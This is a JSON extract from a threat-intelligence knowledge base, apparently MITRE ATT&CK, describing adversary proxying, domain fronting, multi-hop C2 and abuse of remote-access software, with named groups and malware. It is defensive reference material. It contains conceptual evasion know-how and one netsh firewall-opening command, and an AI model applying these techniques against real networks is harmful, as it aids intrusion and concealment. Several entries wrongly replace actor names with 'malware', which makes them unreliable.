                "description": "Adversaries may use an internal proxy to direct command and control traffic between two or more systems in a compromised environment. Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN, ZXProxy, and ZXPortMap. [1] Adversaries use internal proxies to manage command and control communications inside a compromised environment, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between infected systems to avoid suspicion. Internal proxy connections may use common peer-to-peer (p2p) networking protocols, such as SMB, to better blend in with the environment.By using a compromised internal system as a proxy, adversaries may conceal the true destination of C2 traffic while reducing the need for numerous connections to external systems.",
                "Procedure": {
                    "G0087": {
                        "ID": "G0087",
                        "Name": "APT39",
                        "Description": "<name> used custom tools to create SOCK5 and custom protocol proxies between infected hosts.[2][3]"
                    },
                    "S0031": {
                        "ID": "S0031",
                        "Name": "BACKSPACE",
                        "Description": "The \"ZJ\" variant of <name> allows \"ZJ link\" infections with Internet access to relay traffic from \"ZJ listen\" to a command server.[4]"
                    },
                    "S0023": {
                        "ID": "S0023",
                        "Name": "CHOPSTICK",
                        "Description": "<name> used a proxy server between victims and the C2 server.[5]"
                    },
                    "S0154": {
                        "ID": "S0154",
                        "Name": "Cobalt Strike",
                        "Description": "<name> can be configured to have commands relayed over a peer-to-peer network of infected hosts. This can be used to limit the number of egress points, or provide access to a host without direct internet access.[6][7]"
                    },
                    "S0502": {
                        "ID": "S0502",
                        "Name": "Drovorub",
                        "Description": "<name> can use a port forwarding rule on its agent module to relay network traffic through the client module to a remote host on the same network.[8]"
                    },
                    "S0038": {
                        "ID": "S0038",
                        "Name": "Duqu",
                        "Description": "<name> can be configured to have commands relayed over a peer-to-peer network of infected hosts if some of the hosts do not have Internet access.[9]"
                    },
                    "S0512": {
                        "ID": "S0512",
                        "Name": "FatDuke",
                        "Description": "<name> can used pipes to connect machines with restricted internet access to remote machines via other infected hosts.[10]"
                    },
                    "G1016": {
                        "ID": "G1016",
                        "Name": "FIN13",
                        "Description": "<name> has utilized a proxy tool to communicate between compromised assets.[11]"
                    },
                    "G0126": {
                        "ID": "G0126",
                        "Name": "Higaisa",
                        "Description": "<name> discovered system proxy settings and used them if available.[12]"
                    },
                    "S0009": {
                        "ID": "S0009",
                        "Name": "Hikit",
                        "Description": "<name> supports peer connections.[13]"
                    },
                    "S0260": {
                        "ID": "S0260",
                        "Name": "InvisiMole",
                        "Description": "<name> can function as a proxy to create a server that relays communication between the client and C&C server, or between two clients.[14]"
                    },
                    "S0265": {
                        "ID": "S0265",
                        "Name": "Kazuar",
                        "Description": "<name> has used internal nodes on the compromised network for C2 communications.[15]"
                    },
                    "G0032": {
                        "ID": "G0032",
                        "Name": "Lazarus Group",
                        "Description": "<name> has used a compromised router to serve as a proxy between a victim network's corporate and restricted segments.[16]"
                    },
                    "S1060": {
                        "ID": "S1060",
                        "Name": "Mafalda",
                        "Description": "<name> can create a named pipe to listen for and send data to a named pipe-based C2 server.[17]"
                    },
                    "S1059": {
                        "ID": "S1059",
                        "Name": "metaMain",
                        "Description": "<name> can create a named pipe to listen for and send data to a named pipe-based C2 server.[17]"
                    },
                    "S0051": {
                        "ID": "S0051",
                        "Name": "MiniDuke",
                        "Description": "<name> can can use a named pipe to forward communications from one compromised machine with internet access to other compromised machines.[10]"
                    },
                    "S0699": {
                        "ID": "S0699",
                        "Name": "Mythic",
                        "Description": "<name> can leverage a peer-to-peer C2 profile between agents.[18]"
                    },
                    "S1100": {
                        "ID": "S1100",
                        "Name": "Ninja",
                        "Description": "<name> can proxy C2 communications including to and from internal agents without internet connectivity.[19][20]"
                    },
                    "C0014": {
                        "ID": "C0014",
                        "Name": "Operation Wocao",
                        "Description": "During <name>, threat actors proxied traffic through multiple infected systems.[21]"
                    },
                    "S0556": {
                        "ID": "S0556",
                        "Name": "Pay2Key",
                        "Description": "<name> has designated machines in the compromised network to serve as reverse proxy pivot points to channel communications with C2.[22][23]"
                    },
                    "C0024": {
                        "ID": "C0024",
                        "Name": "SolarWinds Compromise",
                        "Description": "During the <name>, APT29 used SSH port forwarding capabilities on public-facing systems, and configured at least one instance of Cobalt Strike to use a network pipe over SMB.[24][25]"
                    },
                    "G0041": {
                        "ID": "G0041",
                        "Name": "Strider",
                        "Description": "<name> has used local servers with both local network and Internet access to act as internal proxy nodes to exfiltrate data from other parts of the network without direct Internet access.[26]"
                    },
                    "S0603": {
                        "ID": "S0603",
                        "Name": "Stuxnet",
                        "Description": "<name> installs an RPC server for P2P communications.[27]"
                    },
                    "G0010": {
                        "ID": "G0010",
                        "Name": "Turla",
                        "Description": "<name> has compromised internal network systems to act as a proxy to forward traffic to C2.[28]"
                    },
                    "G1017": {
                        "ID": "G1017",
                        "Name": "Volt Typhoon",
                        "Description": "<name> has used the built-in netsh port proxy command to create proxies on compromised systems to facilitate access.[29]"
                    },
                    "S0141": {
                        "ID": "S0141",
                        "Name": "Winnti for Windows",
                        "Description": "The <name> HTTP/S C2 mode can make use of a local proxy.[30]"
                    }
                }
            },
            "002": {
                "name": "External Proxy",
                "href": "/techniques/T1090/002",
                "description": "Adversaries may use an external proxy to act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN, ZXProxy, and ZXPortMap. [1] Adversaries use these types of proxies to manage command and control communications, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths to avoid suspicion.External connection proxies are used to mask the destination of C2 traffic and are typically implemented with port redirectors. Compromised systems outside of the victim environment may be used for these purposes, as well as purchased infrastructure such as cloud-based resources or virtual private servers. Proxies may be chosen based on the low likelihood that a connection to them from a compromised system would be investigated. Victim systems would communicate directly with the external proxy on the Internet and then the proxy would forward communications to the C2 server.",
                "Procedure": {
                    "G0007": {
                        "ID": "G0007",
                        "Name": "APT28",
                        "Description": "<name> used other victims as proxies to relay command traffic, for instance using a compromised Georgian military email server as a hop point to NATO victims. The group has also used a tool that acts as a proxy to allow C2 even if the victim is behind a router. <name> has also used a machine to relay and obscure communications between CHOPSTICK and their server.[2][3][4]"
                    },
                    "G0016": {
                        "ID": "G0016",
                        "Name": "APT29",
                        "Description": "<name> uses compromised residential endpoints as proxies for defense evasion and network access.[5]"
                    },
                    "G0022": {
                        "ID": "G0022",
                        "Name": "APT3",
                        "Description": "An <name> downloader establishes SOCKS5 connections for its initial C2.[6]"
                    },
                    "G0087": {
                        "ID": "G0087",
                        "Name": "APT39",
                        "Description": "<name> has used various tools to proxy C2 communications.[7]"
                    },
                    "G0053": {
                        "ID": "G0053",
                        "Name": "FIN5",
                        "Description": "<name> maintains access to victim environments by using FLIPSIDE to create a proxy for a backup RDP tunnel.[8]"
                    },
                    "G0093": {
                        "ID": "G0093",
                        "Name": "GALLIUM",
                        "Description": "<name> used a modified version of HTRAN to redirect connections between networks.[9]"
                    },
                    "S0260": {
                        "ID": "S0260",
                        "Name": "InvisiMole",
                        "Description": "<name> <name> can identify proxy servers used by the victim and use them for C2 communication.[10][11]"
                    },
                    "G0032": {
                        "ID": "G0032",
                        "Name": "Lazarus Group",
                        "Description": "<name> has used multiple proxies to obfuscate network traffic from victims.[12][13]"
                    },
                    "G0045": {
                        "ID": "G0045",
                        "Name": "menuPass",
                        "Description": "<name> has used a global service provider's IP as a proxy for C2 traffic from a victim.[14][15]"
                    },
                    "G0069": {
                        "ID": "G0069",
                        "Name": "MuddyWater",
                        "Description": "<name> has controlled POWERSTATS from behind a proxy network to obfuscate the C2 location.[16] <name> has used a series of compromised websites that victims connected to randomly to relay information to command and control (C2).[17][18]"
                    },
                    "S0699": {
                        "ID": "S0699",
                        "Name": "Mythic",
                        "Description": "<name> can leverage a modified SOCKS5 proxy to tunnel egress C2 traffic.[19]"
                    },
                    "S0439": {
                        "ID": "S0439",
                        "Name": "Okrum",
                        "Description": "<name> can identify proxy servers configured and used by the victim, and use it to make HTTP requests to C2 its server.[20]"
                    },
                    "S0223": {
                        "ID": "S0223",
                        "Name": "POWERSTATS",
                        "Description": "<name> has connected to C2 servers through proxies.[21]"
                    },
                    "S0650": {
                        "ID": "S0650",
                        "Name": "QakBot",
                        "Description": "<name> has a module that can proxy C2 communications.[22]"
                    },
                    "S1084": {
                        "ID": "S1084",
                        "Name": "QUIETEXIT",
                        "Description": "<name> can proxy traffic via SOCKS.[23]"
                    },
                    "S0019": {
                        "ID": "S0019",
                        "Name": "Regin",
                        "Description": "<name> leveraged several compromised universities as proxies to obscure its origin.[24]"
                    },
                    "S0444": {
                        "ID": "S0444",
                        "Name": "ShimRat",
                        "Description": "<name> can use pre-configured HTTP proxies.[25]"
                    },
                    "G0091": {
                        "ID": "G0091",
                        "Name": "Silence",
                        "Description": "<name> has used ProxyBot, which allows the attacker to redirect traffic from the current node to the backconnect server via Sock4\\Socks5.[26]"
                    },
                    "G0131": {
                        "ID": "G0131",
                        "Name": "Tonto Team",
                        "Description": "<name> has routed their traffic through an external server in order to obfuscate their location.[27]"
                    },
                    "S0266": {
                        "ID": "S0266",
                        "Name": "TrickBot",
                        "Description": "<name> has been known to reach a command and control server via one of nine proxy IP addresses. [28] [29]"
                    },
                    "S0141": {
                        "ID": "S0141",
                        "Name": "Winnti for Windows",
                        "Description": "The <name> HTTP/S C2 mode can make use of an external proxy.[30]"
                    }
                }
            },
            "003": {
                "name": "Multi-hop Proxy",
                "href": "/techniques/T1090/003",
                "description": "Adversaries may chain together multiple proxies to disguise the source of malicious traffic. Typically, a defender will be able to identify the last proxy traffic traversed before it enters their network; the defender may or may not be able to identify any previous proxies before the last-hop proxy. This technique makes identifying the original source of the malicious traffic even more difficult by requiring the defender to trace malicious traffic through several proxies to identify its source.For example, adversaries may construct or use onion routing networks \u2013 such as the publicly available Tor network \u2013 to transport encrypted C2 traffic through a compromised population, allowing communication with any device within the network.[1]In the case of network infrastructure, it is possible for an adversary to leverage multiple compromised devices to create a multi-hop proxy chain (i.e., Network Devices). By leveraging Patch System Image on routers, adversaries can add custom code to the affected network devices that will implement onion routing between those nodes. This method is dependent upon the Network Boundary Bridging method allowing the adversaries to cross the protected network boundary of the Internet perimeter and into the organization\u2019s Wide-Area Network (WAN).  Protocols such as ICMP may be used as a transport.Similarly, adversaries may abuse peer-to-peer (P2P) and blockchain-oriented infrastructure to implement routing between a decentralized network of peers.[2]",
                "Procedure": {
                    "G0007": {
                        "ID": "G0007",
                        "Name": "APT28",
                        "Description": "<name> has routed traffic over Tor and VPN servers to obfuscate their activities.[3]"
                    },
                    "G0016": {
                        "ID": "G0016",
                        "Name": "APT29",
                        "Description": "A backdoor used by <name> created a Tor hidden service to forward traffic from the Tor client to local ports 3389 (RDP), 139 (Netbios), and 445 (SMB) enabling full remote access from outside the network and has also used TOR.[4][5]"
                    },
                    "S0438": {
                        "ID": "S0438",
                        "Name": "Attor",
                        "Description": "<name> has used Tor for C2 communication.[6]"
                    },
                    "C0004": {
                        "ID": "C0004",
                        "Name": "CostaRicto",
                        "Description": "During <name>, the threat actors used a layer of proxies to manage C2 communications.[7]"
                    },
                    "S0687": {
                        "ID": "S0687",
                        "Name": "Cyclops Blink",
                        "Description": "<name> has used Tor nodes for C2 traffic.[8]"
                    },
                    "S0281": {
                        "ID": "S0281",
                        "Name": "Dok",
                        "Description": "<name> downloads and installs Tor via homebrew.[9]"
                    },
                    "S0384": {
                        "ID": "S0384",
                        "Name": "Dridex",
                        "Description": "<name> can use multiple layers of proxy servers to hide terminal nodes in its infrastructure.[10]"
                    },
                    "G0085": {
                        "ID": "G0085",
                        "Name": "FIN4",
                        "Description": "<name> has used Tor to log in to victims' email accounts.[11]"
                    },
                    "S0342": {
                        "ID": "S0342",
                        "Name": "GreyEnergy",
                        "Description": "<name> has used Tor relays for Command and Control servers.[12]"
                    },
                    "G0100": {
                        "ID": "G0100",
                        "Name": "Inception",
                        "Description": "<name> used chains of compromised routers to proxy C2 communications between them and cloud service providers.[13]"
                    },
                    "S0604": {
                        "ID": "S0604",
                        "Name": "Industroyer",
                        "Description": "<name> used Tor nodes for C2.[14]"
                    },
                    "S0276": {
                        "ID": "S0276",
                        "Name": "Keydnap",
                        "Description": "<name> uses a copy of tor2web proxy for HTTPS communications.[15]"
                    },
                    "S0641": {
                        "ID": "S0641",
                        "Name": "Kobalos",
                        "Description": "<name> can chain together multiple compromised machines as proxies to reach their final targets.[16][17]"
                    },
                    "G0065": {
                        "ID": "G0065",
                        "Name": "Leviathan",
                        "Description": "<name> has used multi-hop proxies to disguise the source of their malicious traffic.[18]"
                    },
                    "S0282": {
                        "ID": "S0282",
                        "Name": "MacSpy",
                        "Description": "<name> uses Tor for command and control.[9]"
                    },
                    "S1106": {
                        "ID": "S1106",
                        "Name": "NGLite",
                        "Description": "<name> has abused NKN infrastructure for its C2 communication.[2]"
                    },
                    "S1100": {
                        "ID": "S1100",
                        "Name": "Ninja",
                        "Description": "<name> has the ability to use a proxy chain with up to 255 hops when using TCP.[19]"
                    },
                    "S1107": {
                        "ID": "S1107",
                        "Name": "NKAbuse",
                        "Description": "<name> has abused the NKN public blockchain protocol for its C2 communications.[20][21]"
                    },
                    "C0014": {
                        "ID": "C0014",
                        "Name": "Operation Wocao",
                        "Description": "During <name>, threat actors executed commands through the installed web shell via Tor exit nodes.[22]"
                    },
                    "S0623": {
                        "ID": "S0623",
                        "Name": "Siloscape",
                        "Description": "<name> uses Tor to communicate with C2.[23]"
                    },
                    "S0491": {
                        "ID": "S0491",
                        "Name": "StrongPity",
                        "Description": "<name> can use multiple layers of proxy servers to hide terminal nodes in its infrastructure.[24]"
                    },
                    "S0183": {
                        "ID": "S0183",
                        "Name": "Tor",
                        "Description": "Traffic traversing the <name> network will be forwarded to multiple nodes before exiting the <name> network and continuing on to its intended destination.[25]"
                    },
                    "S0022": {
                        "ID": "S0022",
                        "Name": "Uroburos",
                        "Description": "<name> can use implants on multiple compromised machines to proxy communications through its worldwide P2P network.[26]"
                    },
                    "S0386": {
                        "ID": "S0386",
                        "Name": "Ursnif",
                        "Description": "<name> has used Tor for C2.[27][28]"
                    },
                    "S0366": {
                        "ID": "S0366",
                        "Name": "WannaCry",
                        "Description": "<name> uses Tor for command and control traffic.[29]"
                    }
                }
            },
            "004": {
                "name": "Domain Fronting",
                "href": "/techniques/T1090/004",
                "description": "Adversaries may take advantage of routing schemes in Content Delivery Networks (CDNs) and other services which host multiple domains to obfuscate the intended destination of HTTPS traffic or traffic tunneled through HTTPS. [1] Domain fronting involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header. If both domains are served from the same CDN, then the CDN may route to the address specified in the HTTP header after unwrapping the TLS header. A variation of the the technique, \"domainless\" fronting, utilizes a SNI field that is left blank; this may allow the fronting to work even when the CDN attempts to validate that the SNI and HTTP Host fields match (if the blank SNI fields are ignored).For example, if domain-x and domain-y are customers of the same CDN, it is possible to place domain-x in the TLS header and domain-y in the HTTP header. Traffic will appear to be going to domain-x, however the CDN may route it to domain-y.",
                "Procedure": {
                    "G0016": {
                        "ID": "G0016",
                        "Name": "APT29",
                        "Description": "<name> has used the meek domain fronting plugin for Tor to hide the destination of C2 traffic.[2]"
                    },
                    "S0154": {
                        "ID": "S0154",
                        "Name": "Cobalt Strike",
                        "Description": "<name> has the ability to accept a value for HTTP Host Header to enable domain fronting.[3]"
                    },
                    "S0175": {
                        "ID": "S0175",
                        "Name": "meek",
                        "Description": "<name> uses Domain Fronting to disguise the destination of network traffic as another server that is hosted in the same Content Delivery Network (CDN) as the intended destination."
                    },
                    "S0699": {
                        "ID": "S0699",
                        "Name": "Mythic",
                        "Description": "<name> supports domain fronting via custom request headers.[4]"
                    },
                    "S0649": {
                        "ID": "S0649",
                        "Name": "SMOKEDHAM",
                        "Description": "<name> has used a fronted domain to obfuscate its hard-coded C2 server domain.[5]"
                    }
                }
            }
        },
        "tactic": "Command and Control",
        "description": "Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN, ZXProxy, and ZXPortMap. [1] Adversaries use these types of proxies to manage command and control communications, reduce the number of simultaneous outbound network connections, provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion. Adversaries may chain together multiple proxies to further disguise the source of malicious traffic.Adversaries can also take advantage of routing schemes in Content Delivery Networks (CDNs) to proxy command and control traffic.",
        "Procedure": {
            "G0096": {
                "ID": "G0096",
                "Name": "APT41",
                "Description": "malware used a tool called CLASSFON to covertly proxy network communications.[2]"
            },
            "S0456": {
                "ID": "S0456",
                "Name": "Aria-body",
                "Description": "malware has the ability to use a reverse SOCKS proxy module.[3]"
            },
            "S0347": {
                "ID": "S0347",
                "Name": "AuditCred",
                "Description": "malware can utilize proxy for communications.[4]"
            },
            "S0245": {
                "ID": "S0245",
                "Name": "BADCALL",
                "Description": "malware functions as a proxy server between the victim and C2 server.[5]"
            },
            "S1081": {
                "ID": "S1081",
                "Name": "BADHATCH",
                "Description": "malware can use SOCKS4 and SOCKS5 proxies to connect to actor-controlled C2 servers. malware can also emulate a reverse proxy on a compromised machine to connect with actor-controlled C2 servers.[6]"
            },
            "S0268": {
                "ID": "S0268",
                "Name": "Bisonal",
                "Description": "malware has supported use of a proxy server.[7]"
            },
            "G0108": {
                "ID": "G0108",
                "Name": "Blue Mockingbird",
                "Description": "malware has used frp, ssf, and Venom to establish SOCKS proxy connections.[8]"
            },
            "C0017": {
                "ID": "C0017",
                "Name": "C0017",
                "Description": "During malware, APT41 used the Cloudflare CDN to proxy C2 traffic.[9]"
            },
            "C0027": {
                "ID": "C0027",
                "Name": "C0027",
                "Description": "During malware, Scattered Spider installed the open-source rsocx reverse proxy tool on a targeted ESXi appliance.[10]"
            },
            "S0348": {
                "ID": "S0348",
                "Name": "Cardinal RAT",
                "Description": "malware can act as a reverse proxy.[11]"
            },
            "G1021": {
                "ID": "G1021",
                "Name": "Cinnamon Tempest",
                "Description": "malware has used a customized version of the Iox port-forwarding and proxy tool.[12]"
            },
            "G0052": {
                "ID": "G0052",
                "Name": "CopyKittens",
                "Description": "malware has used the AirVPN service for operational activity.[13]"
            },
            "S0384": {
                "ID": "S0384",
                "Name": "Dridex",
                "Description": "malware contains a backconnect module for tunneling network traffic through a victim's computer. Infected computers become part of a P2P botnet that can relay C2 traffic to other infected peers.[14][15]"
            },
            "G1006": {
                "ID": "G1006",
                "Name": "Earth Lusca",
                "Description": "malware adopted Cloudflare as a proxy for compromised servers.[16]"
            },
            "G0117": {
                "ID": "G0117",
                "Name": "Fox Kitten",
                "Description": "malware has used the open source reverse proxy tools including FRPC and Go Proxy to establish connections from C2 to local servers.[17][18][19]"
            },
            "S1044": {
                "ID": "S1044",
                "Name": "FunnyDream",
                "Description": "malware can identify and use configured proxies in a compromised network for C2 communication.[20]"
            },
            "S0690": {
                "ID": "S0690",
                "Name": "Green Lambert",
                "Description": "malware can use proxies for C2 traffic.[21][22]"
            },
            "S0246": {
                "ID": "S0246",
                "Name": "HARDRAIN",
                "Description": "malware uses the command cmd.exe /c netsh firewall add portopening TCP 443 \"adp\" and makes the victim machine function as a proxy server.[23]"
            },
            "S0376": {
                "ID": "S0376",
                "Name": "HOPLIGHT",
                "Description": "malware has multiple proxy options that mask traffic between the malware and the remote operators.[24]"
            },
            "S0040": {
                "ID": "S0040",
                "Name": "HTRAN",
                "Description": "malware can proxy TCP socket connections to obfuscate command and control infrastructure.[25][26]"
            },
            "S0283": {
                "ID": "S0283",
                "Name": "jRAT",
                "Description": "malware can serve as a SOCKS proxy server.[27]"
            },
            "S0487": {
                "ID": "S0487",
                "Name": "Kessel",
                "Description": "malware can use a proxy during exfiltration if set in the configuration.[28]"
            },
            "S1051": {
                "ID": "S1051",
                "Name": "KEYPLUG",
                "Description": "malware has used Cloudflare CDN associated infrastructure to redirect C2 communications to malicious domains.[9]"
            },
            "S0669": {
                "ID": "S0669",
                "Name": "KOCTOPUS",
                "Description": "malware has deployed a modified version of Invoke-Ngrok to expose open local ports to the Internet.[29]"
            },
            "G1004": {
                "ID": "G1004",
                "Name": "LAPSUS$",
                "Description": "malware has leverage NordVPN for its egress points when targeting intended victims.[30]"
            },
            "S1121": {
                "ID": "S1121",
                "Name": "LITTLELAMB.WOOLTEA",
                "Description": "malware has the ability to function as a SOCKS proxy.[31]"
            },
            "G0059": {
                "ID": "G0059",
                "Name": "Magic Hound",
                "Description": "malware has used Fast Reverse Proxy (FRP) for RDP traffic.[32]"
            },
            "G1019": {
                "ID": "G1019",
                "Name": "MoustachedBouncer",
                "Description": "malware has used a reverse proxy tool similar to the GitHub repository revsocks.[33]"
            },
            "S0108": {
                "ID": "S0108",
                "Name": "netsh",
                "Description": "malware can be used to set up a proxy tunnel to allow remote host access to an infected host.[34]"
            },
            "S0198": {
                "ID": "S0198",
                "Name": "NETWIRE",
                "Description": "malware can implement use of proxies to pivot traffic.[35]"
            },
            "S0508": {
                "ID": "S0508",
                "Name": "ngrok",
                "Description": "malware can be used to proxy connections to machines located behind NAT or firewalls.[36][37]"
            },
            "C0013": {
                "ID": "C0013",
                "Name": "Operation Sharpshooter",
                "Description": "For malware, the threat actors used the ExpressVPN service to hide their location.[38]"
            },
            "C0014": {
                "ID": "C0014",
                "Name": "Operation Wocao",
                "Description": "During malware, threat actors used a custom proxy tool called \"Agent\" which has support for multiple hops.[39]"
            },
            "S0435": {
                "ID": "S0435",
                "Name": "PLEAD",
                "Description": "malware has the ability to proxy network communications.[40]"
            },
            "G1005": {
                "ID": "G1005",
                "Name": "POLONIUM",
                "Description": "malware has used the AirVPN service for operational activity.[13]"
            },
            "S0378": {
                "ID": "S0378",
                "Name": "PoshC2",
                "Description": "malware contains modules that allow for use of proxies in command and control.[41]"
            },
            "S0262": {
                "ID": "S0262",
                "Name": "QuasarRAT",
                "Description": "malware can communicate over a reverse proxy using SOCKS5.[42][43]"
            },
            "S0629": {
                "ID": "S0629",
                "Name": "RainyDay",
                "Description": "malware can use proxy tools including boost_proxy_client for reverse proxy functionality.[44]"
            },
            "S0332": {
                "ID": "S0332",
                "Name": "Remcos",
                "Description": "malware uses the infected hosts as SOCKS5 proxies to allow for tunneling and proxying.[45]"
            },
            "S1099": {
                "ID": "S1099",
                "Name": "Samurai",
                "Description": "malware has the ability to proxy connections to specified remote IPs and ports through a a proxy module.[46]"
            },
            "G0034": {
                "ID": "G0034",
                "Name": "Sandworm Team",
                "Description": "malware's BCS-server tool can create an internal proxy server to redirect traffic from the adversary-controlled C2 to internal servers which may not be connected to the internet, but are interconnected locally.[47]"
            },
            "S0461": {
                "ID": "S0461",
                "Name": "SDBbot",
                "Description": "malware has the ability to use port forwarding to establish a proxy between a target host and C2.[48]"
            },
            "S0273": {
                "ID": "S0273",
                "Name": "Socksbot",
                "Description": "malware can start SOCKS proxy threads.[49]"
            },
            "S0615": {
                "ID": "S0615",
                "Name": "SombRAT",
                "Description": "malware has the ability to use an embedded SOCKS proxy in C2 communications.[50]"
            },
            "S0436": {
                "ID": "S0436",
                "Name": "TSCookie",
                "Description": "malware has the ability to proxy communications with command and control (C2) servers.[51]"
            },
            "G0010": {
                "ID": "G0010",
                "Name": "Turla",
                "Description": "malware RPC backdoors have included local UPnP RPC proxies.[52]"
            },
            "S0263": {
                "ID": "S0263",
                "Name": "TYPEFRAME",
                "Description": "A malware variant can force the compromised system to function as a proxy server.[53]"
            },
            "S0386": {
                "ID": "S0386",
                "Name": "Ursnif",
                "Description": "malware has used a peer-to-peer (P2P) network for C2.[54][55]"
            },
            "S0207": {
                "ID": "S0207",
                "Name": "Vasport",
                "Description": "malware is capable of tunneling though a proxy.[56]"
            },
            "G1017": {
                "ID": "G1017",
                "Name": "Volt Typhoon",
                "Description": "malware has used compromised devices and customized versions of open source tools  such as Fast Reverse Proxy (FRP), Earthworm, and Impacket to proxy network traffic.[57][58]"
            },
            "S0670": {
                "ID": "S0670",
                "Name": "WarzoneRAT",
                "Description": "malware has the capability to act as a reverse proxy.[59]"
            },
            "G0124": {
                "ID": "G0124",
                "Name": "Windigo",
                "Description": "malware has delivered a generic Windows proxy Win32/Glubteta.M. malware has also used multiple reverse proxy chains as part of their C2 infrastructure.[60]"
            },
            "S0117": {
                "ID": "S0117",
                "Name": "XTunnel",
                "Description": "malware relays traffic between a C2 server and a victim.[61]"
            },
            "S1114": {
                "ID": "S1114",
                "Name": "ZIPLINE",
                "Description": "malware can create a proxy server on compromised hosts.[62][63]"
            },
            "S0412": {
                "ID": "S0412",
                "Name": "ZxShell",
                "Description": "malware can set up an HTTP or SOCKS proxy.[2][64]"
            }
        }
    },
    "T1219": {
        "ttp_name": "Remote Access Software",
        "ttp_id": "T1219",
        "href": "/techniques/T1219",
        "tactic": "Command and Control",
        "description": "An adversary may use legitimate desktop support and remote access software to establish an interactive command and control channel to target systems within networks. These services, such as VNC, Team Viewer, AnyDesk, ScreenConnect, LogMein, AmmyyAdmin, and other remote monitoring and management (RMM) tools, are commonly used as legitimate technical support software and may be allowed by application control within a target environment.[1][2][3]Remote access software may be installed and used post-compromise as an alternate communications channel for redundant access or as a way to establish an interactive remote desktop session with the target system. They may also be used as a component of malware to establish a reverse connection or back-connect to a service or adversary-controlled system.Adversaries may similarly abuse response features included in EDR and other defensive tools that enable remote access.Installation of many remote access software may also include persistence (e.g., the software's installation routine creates a Windows Service). Remote access modules/features may also exist as part of otherwise existing software (e.g., Google Chrome\u2019s Remote Desktop).[4][5]",
        "Procedure": {
            "G1024": {
                "ID": "G1024",
                "Name": "Akira",
                "Description": "malware uses legitimate utilities such as AnyDesk and PuTTy for maintaining remote access to victim environments.[6][7]"
            },
            "C0015": {
                "ID": "C0015",
                "Name": "C0015",
                "Description": "During malware, the threat actors installed the AnyDesk remote desktop application onto the compromised network.[8]"
            },
            "C0018": {
                "ID": "C0018",
                "Name": "C0018",
                "Description": "During malware, the threat actors used AnyDesk to transfer tools between systems.[9][10]"
            },
            "C0027": {
                "ID": "C0027",
                "Name": "C0027",
                "Description": "During malware, Scattered Spider directed victims to run remote monitoring and management (RMM) tools.[11]"
            },
            "S0030": {
                "ID": "S0030",
                "Name": "Carbanak",
                "Description": "malware has a plugin for VNC and Ammyy Admin Tool.[12]"
            },
            "G0008": {
                "ID": "G0008",
                "Name": "Carbanak",
                "Description": "malware used legitimate programs such as AmmyyAdmin and Team Viewer for remote interactive C2 to target systems.[13]"
            },
            "G0080": {
                "ID": "G0080",
                "Name": "Cobalt Group",
                "Description": "malware used the Ammyy Admin tool as well as TeamViewer for remote access, including to preserve remote access if a Cobalt Strike module was lost.[14][15][16]"
            },
            "G0105": {
                "ID": "G0105",
                "Name": "DarkVishnya",
                "Description": "malware used DameWare Mini Remote Control for lateral movement.[17]"
            },
            "S0384": {
                "ID": "S0384",
                "Name": "Dridex",
                "Description": "malware contains a module for VNC.[18]"
            },
            "S0554": {
                "ID": "S0554",
                "Name": "Egregor",
                "Description": "malware has checked for the LogMein event log in an attempt to encrypt files in remote machines.[19]"
            },
            "G0120": {
                "ID": "G0120",
                "Name": "Evilnum",
                "Description": "EVILNUM has used the malware variant, TerraTV, to run a legitimate TeamViewer application to connect to compromrised machines.[20]"
            },
            "G0046": {
                "ID": "G0046",
                "Name": "FIN7",
                "Description": "malware has utilized the remote management tool Atera to download malware to a compromised system.[21]"
            },
            "G0115": {
                "ID": "G0115",
                "Name": "GOLD SOUTHFIELD",
                "Description": "malware has used the cloud-based remote management and monitoring tool \"ConnectWise Control\" to deploy REvil.[22]"
            },
            "S0601": {
                "ID": "S0601",
                "Name": "Hildegard",
                "Description": "malware has established tmate sessions for C2 communications.[23]"
            },
            "G0094": {
                "ID": "G0094",
                "Name": "Kimsuky",
                "Description": "malware has used a modified TeamViewer client as a command and control channel.[24][25]"
            },
            "G0069": {
                "ID": "G0069",
                "Name": "MuddyWater",
                "Description": "malware has used legitimate applications ScreenConnect and AteraAgent to manage systems remotely and move laterally.[26][27][28]"
            },
            "G0129": {
                "ID": "G0129",
                "Name": "Mustang Panda",
                "Description": "malware has installed TeamViewer on targeted systems.[29]"
            },
            "C0002": {
                "ID": "C0002",
                "Name": "Night Dragon",
                "Description": "During malware, threat actors used several remote administration tools as persistent infiltration channels.[30]"
            },
            "S0148": {
                "ID": "S0148",
                "Name": "RTM",
                "Description": "malware has the capability to download a VNC module from command and control (C2).[31]"
            },
            "G0048": {
                "ID": "G0048",
                "Name": "RTM",
                "Description": "malware has used a modified version of TeamViewer and Remote Utilities for remote access.[32]"
            },
            "G0034": {
                "ID": "G0034",
                "Name": "Sandworm Team",
                "Description": "malware has used remote administration tools or remote industrial control system client software for execution and to maliciously release electricity breakers.[33][34]"
            },
            "G1015": {
                "ID": "G1015",
                "Name": "Scattered Spider",
                "Description": "During C0027, malware directed victims to run remote monitoring and management (RMM) tools.[11]In addition to directing victims to run remote software, malware members themselves also deploy RMM software including AnyDesk, LogMeIn, and ConnectWise Control to establish persistence on the compromised network.[35][36]"
            },
            "G0139": {
                "ID": "G0139",
                "Name": "TeamTNT",
                "Description": "malware has established tmate sessions for C2 communications.[23][37]"
            },
            "G0076": {
                "ID": "G0076",
                "Name": "Thrip",
                "Description": "malware used a cloud-based remote access software called LogMeIn for their attacks.[38]"
            },
            "S0266": {
                "ID": "S0266",
                "Name": "TrickBot",
                "Description": "malware uses vncDll module to remote control the victim machine.[39][40]"
            }
        }
    },
    "T1102": {
        "ttp_name": "Web Service",
        "ttp_id": "T1102",
        "href": "/techniques/T1102",
        "subtechnique": {
            "001": {
                "name": "Dead Drop Resolver",
                "href": "/techniques/T1102/001",
